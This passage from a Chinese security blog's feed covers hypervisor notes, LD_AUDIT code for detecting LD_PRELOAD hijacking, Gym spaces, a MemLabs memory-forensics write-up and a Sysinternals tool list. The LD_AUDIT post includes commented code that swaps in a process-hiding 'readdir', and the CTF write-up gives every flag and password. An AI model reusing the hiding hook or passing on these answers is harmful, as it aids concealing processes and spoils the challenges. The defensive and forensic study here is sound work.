<h1 id="Part-6-虚拟化正在运行的系统"><a href="#Part-6-虚拟化正在运行的系统" class="headerlink" title="Part 6: 虚拟化正在运行的系统"></a><a href="https://rayanfam.com/topics/hypervisor-from-scratch-part-6/">Part 6: 虚拟化正在运行的系统</a></h1><div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>CPU_BASED_VM_EXEC_CONTROL</td>
<td>CPU_BASED_ACTIVATE_MSR_BITMAP</td>
</tr>
<tr>
<td>SECONDARY_VM_EXEC_CONTROL</td>
<td>CPU_BASED_CTL2_RDTSCP<br>CPU_BASED_CTL2_ENABLE_INVPCID<br>CPU_BASED_CTL2_ENABLE_XSAVE_XRSTORS</td>
</tr>
</tbody>
</table>
</div>
<p><a href="https://blogs.msdn.microsoft.com/doronh/2010/02/02/what-is-irql/">IRQL</a>(Interrupt Request Level): a Windows-specific mechanism to manage interrupts or giving priority by their level so raising IRQL means your routine will execute with higher priority than normal Windows codes (PASSIVE LEVEL &amp; APC LEVEL).<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">KIRQL OldIrql = KeRaiseIrqlToDpcLevel(); <span class="comment">// raises the IRQL to Dispatch Level so the Windows Scheduler can’t kick in to change the context</span></span><br><span class="line">KeLowerIrql(OldIrql);</span><br></pre></td></tr></table></figure></p>
<p>CPUID is one the main instructions that cause the VM-Exit.</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>内核函数</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>_cpuidex</td>
<td>CPUID</td>
<td>HYPERV_HYPERVISOR_PRESENT_BIT</td>
</tr>
</tbody>
</table>
</div>
<p><a href="https://rayanfam.com/topics/defeating-malware-anti-vm-techniques-cpuid-based-instructions/">Defeating malware’s Anti-VM techniques (CPUID-Based Instructions)</a></p>
]]></content>
      <categories>
        <category>Hypervisor</category>
      </categories>
      <tags>
        <tag>Hypervisor</tag>
      </tags>
  </entry>
  <entry>
    <title>LD_AUDIT对抗LD_PRELOAD</title>
    <url>/2020/10/25/LD-AUDIT%E5%AF%B9%E6%8A%97LD-PRELOAD/</url>
    <content><![CDATA[<ul>
<li>拦截LD_PRELOAD加载的.so</li>
<li>获取LD_PRELOAD中劫持的函数</li>
<li>利用LD_AUDIT劫持函数</li>
</ul>
<span id="more"></span>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;link.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 拦截LD_PRELOAD加载的.so</span></span><br><span class="line"><span class="comment">// const char *preloaded;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// unsigned int la_version(unsigned int version)</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//     preloaded = getenv(&quot;LD_PRELOAD&quot;);</span></span><br><span class="line"><span class="comment">//     return version;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// char *la_objsearch(const char *name, uintptr_t *cookie, unsigned int flag)</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//     if (NULL != preloaded &amp;&amp; strcmp(name, preloaded) == 0)</span></span><br><span class="line"><span class="comment">//     &#123;</span></span><br><span class="line"><span class="comment">//         fprintf(stderr, &quot;Disabling the loading of a &#x27;preload&#x27; library: %s\n&quot;, name);</span></span><br><span class="line"><span class="comment">//         return NULL;</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">//     return (char *)name;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取LD_PRELOAD中劫持的函数</span></span><br><span class="line"><span class="keyword">uintptr_t</span> *preloaded_cookie = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *preloaded;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">la_version</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> version)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    preloaded = getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> version;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">la_objopen</span><span class="params">(struct link_map *<span class="built_in">map</span>, Lmid_t lmid, <span class="keyword">uintptr_t</span> *cookie)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != preloaded &amp;&amp; <span class="built_in">strcmp</span>(<span class="built_in">map</span>-&gt;l_name, preloaded) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;A &#x27;preload&#x27; library is about to load: %s. Following its function binding\n&quot;</span>, <span class="built_in">map</span>-&gt;l_name);</span><br><span class="line">        preloaded_cookie = cookie;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> LA_FLG_BINDTO | LA_FLG_BINDFROM; <span class="comment">// 导向la_symbind64处理函数地址</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uintptr_t</span> <span class="title">la_symbind64</span><span class="params">(Elf64_Sym *sym, <span class="keyword">unsigned</span> <span class="keyword">int</span> ndx, <span class="keyword">uintptr_t</span> *refcook, <span class="keyword">uintptr_t</span> *defcook, <span class="keyword">unsigned</span> <span class="keyword">int</span> *flags, <span class="keyword">const</span> <span class="keyword">char</span> *symname)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (refcook == preloaded_cookie)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Function &#x27;%s&#x27; is intercepted\n&quot;</span>, symname);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sym-&gt;st_value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用LD_AUDIT劫持函数</span></span><br><span class="line"><span class="comment">// unsigned int la_version(unsigned int version)</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//     return version;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// unsigned int la_objopen(struct link_map *map, Lmid_t lmid, uintptr_t *cookie)</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//     return LA_FLG_BINDTO | LA_FLG_BINDFROM;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// uintptr_t la_symbind64(Elf64_Sym *sym, unsigned int ndx, uintptr_t *refcook, uintptr_t *defcook, unsigned int *flags, const char *symname)</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//     if (strcmp(symname, &quot;readdir&quot;) == 0)</span></span><br><span class="line"><span class="comment">//     &#123;</span></span><br><span class="line"><span class="comment">//         fprintf(stderr, &quot;&#x27;readdir&#x27; is called, intercepting.\n&quot;);</span></span><br><span class="line"><span class="comment">//         // readdir is the tampered function declared in processhider.c</span></span><br><span class="line"><span class="comment">//         return readdir; // fix here</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">//     return sym-&gt;st_value;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure>
<p>编译<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gcc -Wall -fPIC -shared -o libaudit.so libaudit.c -ldl</span><br></pre></td></tr></table></figure></p>
<p><a href="https://labs.sentinelone.com/leveraging-ld_audit-to-beat-the-traditional-linux-library-preloading-technique/">原文地址</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Gym.spaces总结</title>
    <url>/2020/06/03/Gym-spaces%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p><a href="https://github.com/openai/gym/tree/master/gym/spaces">源码</a></p>
<span id="more"></span>
<div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th>Box</th>
<th>Dict</th>
<th>Discrete</th>
<th>MultiBinary</th>
<th>MultiDiscrete</th>
<th>Tuple</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td>连续空间</td>
<td>Space字典</td>
<td>离散空间<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="13.564ex" height="1.946ex" role="img" focusable="false" viewBox="0 -666 5995.1 860"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(500, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(944.7, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1444.7, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(1889.3, 0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(3228, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(3672.7, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(4494.9, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(5495.1, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></svg></mjx-container></td>
<td>多维01空间</td>
<td>多维离散空间（游戏控制器）</td>
<td>Space元组</td>
</tr>
<tr>
<td>示例</td>
<td><code>Box(low=-1.0, high=2.0, shape=(3, 4), dtype=np.float32)</code></td>
<td></td>
<td><code>Discrete(2)</code></td>
<td><code>MultiBinary(5)</code></td>
<td><code>MultiDiscrete([ 5, 2, 2 ])</code></td>
<td><code>Tuple((spaces.Discrete(2), spaces.Discrete(3)))</code></td>
</tr>
<tr>
<td>sample</td>
<td></td>
<td></td>
<td></td>
<td>[0,1,0,1,0]</td>
<td></td>
<td>(0, 2)</td>
</tr>
</tbody>
</table>
</div>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># spaces.Dict</span></span><br><span class="line">self.nested_observation_space = spaces.Dict({</span><br><span class="line">    <span class="string">'sensors'</span>:  spaces.Dict({</span><br><span class="line">        <span class="string">'position'</span>: spaces.Box(low=-<span class="number">100</span>, high=<span class="number">100</span>, shape=(<span class="number">3</span>,)),</span><br><span class="line">        <span class="string">'velocity'</span>: spaces.Box(low=-<span class="number">1</span>, high=<span class="number">1</span>, shape=(<span class="number">3</span>,)),</span><br><span class="line">        <span class="string">'front_cam'</span>: spaces.Tuple((</span><br><span class="line">            spaces.Box(low=<span class="number">0</span>, high=<span class="number">1</span>, shape=(<span class="number">10</span>, <span class="number">10</span>, <span class="number">3</span>)),</span><br><span class="line">            spaces.Box(low=<span class="number">0</span>, high=<span class="number">1</span>, shape=(<span class="number">10</span>, <span class="number">10</span>, <span class="number">3</span>))</span><br><span class="line">        )),</span><br><span class="line">        <span class="string">'rear_cam'</span>: spaces.Box(low=<span class="number">0</span>, high=<span class="number">1</span>, shape=(<span class="number">10</span>, <span class="number">10</span>, <span class="number">3</span>)),</span><br><span class="line">    }),</span><br><span class="line">    <span class="string">'ext_controller'</span>: spaces.MultiDiscrete((<span class="number">5</span>, <span class="number">2</span>, <span class="number">2</span>)),</span><br><span class="line">    <span class="string">'inner_state'</span>:spaces.Dict({</span><br><span class="line">        <span class="string">'charge'</span>: spaces.Discrete(<span class="number">100</span>),</span><br><span class="line">        <span class="string">'system_checks'</span>: spaces.MultiBinary(<span class="number">10</span>),</span><br><span class="line">        <span class="string">'job_status'</span>: spaces.Dict({</span><br><span class="line">            <span class="string">'task'</span>: spaces.Discrete(<span class="number">5</span>),</span><br><span class="line">            <span class="string">'progress'</span>: spaces.Box(low=<span class="number">0</span>, high=<span class="number">100</span>, shape=()),</span><br><span class="line">        })</span><br><span class="line">    })</span><br><span class="line">})</span><br></pre></td></tr></table></figure>
<div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th>Action</th>
<th>State</th>
</tr>
</thead>
<tbody>
<tr>
<td>MountainCarContinuous-v0</td>
<td><code>Box(1,)</code></td>
<td><code>Box(2,)</code></td>
</tr>
<tr>
<td><a href="https://github.com/openai/gym/blob/3bd5ef71c2ca3766a26c3dacf87a33a9390ce1e6/gym/envs/box2d/lunar_lander.py">LunarLanderContinuous-v2</a></td>
<td><code>Box(2,)</code></td>
<td><code>Box(8,)</code></td>
</tr>
</tbody>
</table>
</div>
]]></content>
      <tags>
        <tag>gym</tag>
      </tags>
  </entry>
  <entry>
    <title>MemLabs Memory Forensics Challenges</title>
    <url>/2020/01/10/MemLabs-Memory-Forensics-Challenges/</url>
    <content><![CDATA[<p><a href="https://github.com/stuxnet999/MemLabs">MemLabs</a></p>
<p><a href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference">volatility使用说明</a></p>
<p>内存取证挑战，<code>Lab1~6</code><br><span id="more"></span></p>
<h1 id="Lab-1-Beginner’s-Luck"><a href="#Lab-1-Beginner’s-Luck" class="headerlink" title="Lab 1 Beginner’s Luck"></a>Lab 1 Beginner’s Luck</h1><p>Easy<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">volatility -f MemoryDump_Lab1.raw imageinfo <span class="comment"># 检测profile类型</span></span><br><span class="line">volatility -f MemoryDump_Lab1.raw --profile=Win7SP1x64 consoles <span class="comment"># 获取cmd的指令和结果（cmdscan只包括cmd指令）</span></span><br></pre></td></tr></table></figure><br>得到cmd的缓存中有<code>St4G3$1</code>的运行结果<code>ZmxhZ3t0aDFzXzFzX3RoM18xc3Rfc3Q0ZzMhIX0</code>解码得到<code>flag&#123;th1s_1s_th3_1st_st4g3!!&#125;</code>。</p>
<p>内存数据通过<code>DumpIt.exe</code>获取。</p>
<h1 id="Lab-2-A-New-World"><a href="#Lab-2-A-New-World" class="headerlink" title="Lab 2 A New World"></a>Lab 2 A New World</h1><p>Easy<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">volatility -f MemoryDump_Lab2.raw --profile=Win7SP1x64 envars <span class="comment"># 查看环境变量</span></span><br></pre></td></tr></table></figure><br>存在<code>NEW_TMP</code>环境变量，值为<code>C:\Windows\ZmxhZ3t3M2xjMG0zX1QwXyRUNGczXyFfT2ZfTDRCXzJ9</code>，解码得到<code>flag&#123;w3lc0m3_T0_$T4g3_!_Of_L4B_2&#125;</code>。</p>
<h1 id="Lab-3-The-Evil’s-Den"><a href="#Lab-3-The-Evil’s-Den" class="headerlink" title="Lab 3 The Evil’s Den"></a>Lab 3 The Evil’s Den</h1><p>InCTF 2018 Evil Crypter</p>
<p>Easy - Medium<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">volatility -f MemoryDump_Lab3.raw imageinfo <span class="comment"># Win7SP1x86</span></span><br><span class="line">volatility -f MemoryDump_Lab3.raw --profile=Win7SP1x86 iehistory <span class="comment"># ie浏览器历史，在Desktop目录下有可疑文件suspision1.jpeg、evilscript.py.py和vip.txt</span></span><br><span class="line">volatility -f MemoryDump_Lab3.raw --profile=Win7SP1x86 filescan <span class="comment"># 扫描文件，获取文件对应的Offset</span></span><br><span class="line">volatility -f MemoryDump_Lab3.raw --profile=Win7SP1x86 dumpfiles -D ./files -Q 0x000000003e727e50 -n <span class="comment"># 提取vip.txt，其余文件同理</span></span><br></pre></td></tr></table></figure><br>第一部分根据<code>evilscript.py.py</code>（先<code>xor(3)</code>后<code>base64</code>）和加密结果<code>vip.txt</code>可以逆向得到<code>inctf&#123;0n3_h4lf</code>；根据<a href="https://github.com/stuxnet999/MemLabs/tree/master/Lab%203">提示</a>使用<code>steghide extract -sf suspision1.jpeg</code>提取<code>suspision1.jpeg</code>中的隐藏信息，密码为<code>inctf&#123;0n3_h4lf</code>，得到第二部分<code>_1s_n0t_3n0ugh&#125;</code>，即为<code>inctf&#123;0n3_h4lf_1s_n0t_3n0ugh&#125;</code>。</p>
<h1 id="Lab-4-Obsession"><a href="#Lab-4-Obsession" class="headerlink" title="Lab 4 Obsession"></a>Lab 4 Obsession</h1><p><a href="https://blog.bi0s.in/2019/09/24/Forensics/InCTFi19-JustDoIt/">Just Do It - InCTF Internationals 2019</a></p>
<p>Medium<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">volatility -f MemoryDump_Lab4.raw imageinfo <span class="comment"># Win7SP1x64</span></span><br><span class="line">volatility -f MemoryDump_Lab4.raw --profile=Win7SP1x64 iehistory <span class="comment"># 发现Important.txt但无法dumpfiles</span></span><br><span class="line">volatility -f MemoryDump_Lab4.raw --profile=Win7SP1x64 mftparser &gt; mftparse <span class="comment"># 利用MFT查看Important.txt</span></span><br></pre></td></tr></table></figure><br><code>Important.txt</code>已被删除，无法通过<code>dumpfiles</code>获取。使用<code>mftparser</code>检查<code>NTFS</code>的主控文件表<code>MFT</code>的<code>$DATA</code>属性（每个<code>MFT</code>表项为1024字节），参考<a href="https://volatility-labs.blogspot.com/2012/10/omfw-2012-reconstructing-mbr-and-mft.html">OMFW 2012: Reconstructing the MBR and MFT from Memory</a>。最后在<code>mftparse</code>中得到<code>inctf&#123;1_is_n0t_EQu4l_7o_2_bUt_th1s_d0s3nt_m4ke_s3ns3&#125;</code>。</p>
<h1 id="Lab-5-Black-Tuesday"><a href="#Lab-5-Black-Tuesday" class="headerlink" title="Lab 5 Black Tuesday"></a>Lab 5 Black Tuesday</h1><p>Medium - Hard<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">volatility -f MemoryDump_Lab5.raw imageinfo <span class="comment"># Win7SP1x64</span></span><br><span class="line">volatility -f MemoryDump_Lab5.raw --profile=Win7SP1x64 iehistory</span><br><span class="line">volatility -f MemoryDump_Lab5.raw --profile=Win7SP1x64 filescan <span class="comment"># SW1wb3J0YW50.rar</span></span><br><span class="line">volatility -f MemoryDump_Lab5.raw --profile=Win7SP1x64 dumpfiles -D ./files -Q 0x000000003eed56f0 -n</span><br></pre></td></tr></table></figure><br>在<code>iehistory</code>中找到记录<code>C:/Windows/AppPatch/ZmxhZ3shIV93M0xMX2QwbjNfU3Q0ZzMtMV8wZl9MNEJfNV9EMG4zXyEhfQ.bmp</code>，<code>base64</code>解密得到<code>flag&#123;!!_w3LL_d0n3_St4g3-1_0f_L4B_5_D0n3_!!&#125;</code>。在<code>filescan</code>中找到记录<code>\Device\HarddiskVolume2\Users\SmartNet\Documents\SW1wb3J0YW50.rar</code>，<code>dumpfiles</code>下来后使用上一<code>flag</code>作为密码解压，得到<code>Stage2.png</code>，得到第二个<code>flag</code>，为<code>flag&#123;W1th_th1s_$taGe_2_1s_c0mPL3T3_!!&#125;</code>。</p>
<p><img src="/img/memlabs/Stage2.png" alt=""></p>
<h1 id="Lab-6-The-Reckoning"><a href="#Lab-6-The-Reckoning" class="headerlink" title="Lab 6 The Reckoning"></a>Lab 6 The Reckoning</h1><p><a href="https://fireshellsecurity.team/inctf2019-notch-it-up/">InCTF 2019 - Notch It Up</a></p>
<p>Hard<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">volatility -f MemoryDump_Lab6.raw imageinfo <span class="comment"># Win7SP1x64</span></span><br><span class="line">volatility -f MemoryDump_Lab6.raw --profile=Win7SP1x64 iehistory</span><br><span class="line">volatility -f MemoryDump_Lab6.raw --profile=Win7SP1x64 filescan <span class="comment"># flag.rar History</span></span><br><span class="line">volatility -f MemoryDump_Lab6.raw --profile=Win7SP1x64 pstree <span class="comment"># WinRAR.exe 3716</span></span><br><span class="line">volatility -f MemoryDump_Lab6.raw --profile=Win7SP1x64 envars -p 3716 <span class="comment"># RAR password easypeasyvirus</span></span><br></pre></td></tr></table></figure><br>查看<code>WinRAR.exe</code>的环境变量发现密码，解密<code>flag.rar</code>得到<code>flag2.png</code>，为<code>aN_Am4zING_!_i_gU3Ss???_&#125;</code>。</p>
<p><img src="/img/memlabs/flag2.png" alt="flag2.png"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">volatility -f MemoryDump_Lab6.raw --profile=Win7SP1x64 dumpfiles -D ./files -Q 0x000000005da5a610 -n <span class="comment"># History.vacb History.dat</span></span><br><span class="line">volatility -f MemoryDump_Lab6.raw --profile=Win7SP1x64 screenshot -D ./screenshot</span><br></pre></td></tr></table></figure>
<p>检查<code>Chrome</code>的<code>\User Data\Default\History</code>，获得<code>sqlite3</code>数据库文件<code>History.dat</code>，查找记录<code>sqlite3 History.dat &quot;select url from urls;&quot;</code>发现可疑网址<code>https://pastebin.com/RSGSi1hk</code>。</p>
<p>里面有一Google文档的<a href="https://www.google.com/url?q=https://docs.google.com/document/d/1lptcksPt1l_w7Y29V4o6vkEnHToAPqiCkgNNZfS9rCk/edit?usp%3Dsharing&amp;sa=D&amp;source=hangouts&amp;ust=1566208765722000&amp;usg=AFQjCNHXd6Ck6F22MNQEsxdZo21JayPKug">地址</a>，打开后为一大段拉丁语文字，中间有一个MEGA<a href="https://mega.nz/#!SrxQxYTQ">链接</a>，但是存在密码保护。搜索整个内存<code>cat MemoryDump_Lab6.raw.strings | grep -i mega | grep -i key</code>，发现<code>THE KEY IS zyWxCjCYYSEMA-hZe552qWVXiPwa5TecODbjnsscMIU</code>即为下载密钥，获得<code>flag_.png</code>，为另一半flag：<code>inctf&#123;thi5_cH4LL3Ng3_!s_g0nn4_b3_?_</code>。</p>
<p>（也可以通过<code>screenshot</code>获取浏览器标题然后再搜索）</p>
<p><img src="/img/memlabs/flag_.png" alt="flag_.png"></p>
<p><code>inctf&#123;thi5_cH4LL3Ng3_!s_g0nn4_b3_?_aN_Am4zINg_!_i_gU3Ss???_&#125;</code></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><a href="https://www.hackingarticles.in/memory-forensics-using-volatility-framework/">https://www.hackingarticles.in/memory-forensics-using-volatility-framework/</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>SysinternalsSuite工具使用总结</title>
    <url>/2020/01/10/SysinternalsSuite%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p><code>SysinternalsSuite</code>一共有<code>76</code>款实用工具程序，部分程序有<code>32</code>和<code>64</code>位之分。</p>
<span id="more"></span>
<p><code>-accepteula</code>可以避免第一次运行时弹出的提示。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th>名称</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>accesschk(64)</td>
<td></td>
</tr>
<tr>
<td>2</td>
<td>AccessEnum</td>
<td></td>
</tr>
<tr>
<td>3</td>
<td>ADExplorer</td>
<td></td>
</tr>
<tr>
<td>4</td>
<td>ADInsight</td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>adrestore</td>
<td></td>
</tr>
<tr>
<td>6</td>
<td>Autologon</td>
<td></td>
</tr>
<tr>
<td>7</td>
<td>Autoruns(64)</td>
<td></td>
</tr>
<tr>
<td>8</td>
<td>autorunsc(64)</td>
<td></td>
</tr>
<tr>
<td>9</td>
<td>Bginfo(64)</td>
<td></td>
</tr>
<tr>
<td>10</td>
<td>Cacheset</td>
<td></td>
</tr>
<tr>
<td>11</td>
<td>Clockres(64)</td>
<td></td>
</tr>
<tr>
<td>12</td>
<td>Contig(64)</td>
<td></td>
</tr>
<tr>
<td>13</td>
<td>Coreinfo</td>
<td>查看CPU信息，<code>-v</code>查看CPU对虚拟化的支持，需要管理员权限</td>
</tr>
<tr>
<td>14</td>
<td>ctrl2cap</td>
<td></td>
</tr>
<tr>
<td>15</td>
<td>Dbgview</td>
<td>查看<code>DbgPrint()</code>的输出，捕获kernel需要管理员权限</td>
</tr>
<tr>
<td>16</td>
<td>Desktops</td>
<td></td>
</tr>
<tr>
<td>17</td>
<td>disk2vhd</td>
<td></td>
</tr>
<tr>
<td>18</td>
<td>diskext(64)</td>
<td></td>
</tr>
<tr>
<td>19</td>
<td>Diskmon</td>
<td></td>
</tr>
<tr>
<td>20</td>
<td>DiskView</td>
<td></td>
</tr>
<tr>
<td>21</td>
<td>du(64)</td>
<td></td>
</tr>
<tr>
<td>22</td>
<td>efsdump</td>
<td></td>
</tr>
<tr>
<td>23</td>
<td>FindLinks(64)</td>
<td></td>
</tr>
<tr>
<td>24</td>
<td>handle(64)</td>
<td></td>
</tr>
<tr>
<td>25</td>
<td>hex2dec(64)</td>
<td></td>
</tr>
<tr>
<td>26</td>
<td>junction(64)</td>
<td></td>
</tr>
<tr>
<td>27</td>
<td>ldmdump</td>
<td></td>
</tr>
<tr>
<td>28</td>
<td>Listdlls(64)</td>
<td><code>Listdlls64.exe -v chrome</code> 列出已启动程序加载的DLL</td>
</tr>
<tr>
<td>29</td>
<td>livekd(64)</td>
<td></td>
</tr>
<tr>
<td>30</td>
<td>LoadOrd(64)</td>
<td></td>
</tr>
<tr>
<td>31</td>
<td>LoadOrdC(64)</td>
<td></td>
</tr>
<tr>
<td>32</td>
<td>logonsessions(64)</td>
<td></td>
</tr>
<tr>
<td>33</td>
<td>movefile(64)</td>
<td></td>
</tr>
<tr>
<td>34</td>
<td>notmyfault(64)</td>
<td></td>
</tr>
<tr>
<td>35</td>
<td>notmyfaultc(64)</td>
<td></td>
</tr>
<tr>
<td>36</td>
<td>ntfsinfo(64)</td>
<td></td>
</tr>
<tr>
<td>37</td>
<td>pagedfrg</td>
<td></td>
</tr>
<tr>
<td>38</td>
<td>pendmoves(64)</td>
<td></td>
</tr>
<tr>
<td>39</td>
<td>pipelist(64)</td>
<td></td>
</tr>
<tr>
<td>40</td>
<td>portmon</td>
<td></td>
</tr>
